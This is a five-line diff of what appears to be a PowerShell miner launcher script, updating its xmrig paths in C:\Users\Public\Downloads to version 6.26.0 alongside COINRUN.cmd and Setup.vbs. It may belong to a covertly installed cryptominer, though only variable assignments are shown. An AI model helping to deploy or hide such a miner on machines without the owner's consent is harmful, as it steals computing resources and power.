@@ -1,5 +1,5 @@
-$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
-$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
+$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.26.0\xmrig.exe"
+$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.26.0\COINRUN.cmd"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $xmrigProcessName = "xmrig"
 $global:isStarting = $false
